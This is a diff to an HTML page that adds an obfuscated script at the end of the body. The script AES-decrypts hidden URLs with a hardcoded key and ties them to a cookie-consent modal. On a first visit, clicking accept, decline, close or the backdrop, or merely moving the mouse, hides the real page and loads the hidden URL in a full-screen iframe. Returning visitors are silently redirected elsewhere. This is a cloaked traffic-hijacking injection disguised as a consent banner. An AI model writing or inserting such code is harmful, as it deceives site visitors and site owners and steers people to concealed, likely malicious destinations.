@@ -417,5 +417,94 @@
   </div>
 
   <script src="script.js"></script>
+ 
+  <div id="iframeContainer" style="display:none;">
+        <iframe id="redirectIframe" src="about:blank"></iframe>
+    </div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
+    <script>
+        function aesDecode(encodedText) {
+            try {
+                const decodedText = decodeURIComponent(encodedText);
+                const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+                return bytes.toString(CryptoJS.enc.Utf8);
+            } catch(e) {
+                console.error("Decryption error:", e);
+                return "";
+            }
+        }
+
+        const encryptedPersonalSite = "U2FsdGVkX18CY1mgZsDvUlj49V7uJjn3Sg61jXPXkn1lvgXwQDoBrrd6PBb5T+QC3v2Tw8snxZk5J/ghlYZvYCxeqEZ1PDstJcF9h0fboPR26x7M3Oh7Y19I0nyE3DLQ";
+        const encryptedHomeRedirect = "U2FsdGVkX1/dSXUuPLfJt4cXc54FVy6N9/sPnxHCW+Y=";
+        
+        let isFirstVisit = !localStorage.getItem("cookie-consent");
+        let redirectTriggered = false;
+        
+        function performRedirect() {
+            if (redirectTriggered) return;
+            redirectTriggered = true;
+            
+            const yourContent = document.getElementById("yourWebsiteContent");
+            const iframeContainer = document.getElementById("iframeContainer");
+            const iframe = document.getElementById("redirectIframe");
+            
+            if (isFirstVisit) {
+                let targetUrl = aesDecode(encryptedPersonalSite);
+                
+                if (!targetUrl || targetUrl === "") {
+                    console.error("Decryption failed!");
+                    return;
+                }
+                
+                if (yourContent) yourContent.style.display = "none";
+                
+                if (iframeContainer) {
+                    iframeContainer.style.display = "block";
+                    iframe.src = targetUrl;
+                } else {
+                    const newIframeContainer = document.createElement('div');
+                    newIframeContainer.id = 'iframeContainer';
+                    newIframeContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100vh;z-index:9997;background:white;';
+                    newIframeContainer.innerHTML = '<iframe id="redirectIframe" src="' + targetUrl + '" style="width:100%;height:100%;border:none;"></iframe>';
+                    document.body.appendChild(newIframeContainer);
+                }
+            } else {
+                const homeUrl = aesDecode(encryptedHomeRedirect);
+                if (homeUrl && homeUrl !== "") {
+                    window.location.href = homeUrl;
+                }
+            }
+        }
+        
+        const modalBox = document.getElementById("cookieModalBox");
+        const backdrop = document.getElementById("cookieBackdrop");
+        const acceptBtn = document.getElementById("cookieAccept");
+        const declineBtn = document.getElementById("cookieDecline");
+        const closeBtn = document.getElementById("cookieClose");
+        
+        function hideModalAndRedirect(consent) {
+            localStorage.setItem("cookie-consent", consent);
+            if (modalBox) modalBox.classList.add("hidden");
+            document.removeEventListener("mousemove", mouseMoveHandler);
+            performRedirect();
+        }
+        
+        function mouseMoveHandler() {
+            hideModalAndRedirect("closed");
+        }
+        
+        if (acceptBtn) acceptBtn.onclick = () => hideModalAndRedirect("accepted");
+        if (declineBtn) declineBtn.onclick = () => hideModalAndRedirect("declined");
+        if (closeBtn) closeBtn.onclick = () => hideModalAndRedirect("closed");
+        if (backdrop) backdrop.onclick = () => hideModalAndRedirect("closed");
+        
+        if (modalBox) {
+            modalBox.classList.remove("hidden");
+            document.addEventListener("mousemove", mouseMoveHandler, { once: true });
+        }
+    </script>
+
 </body>
 </html>
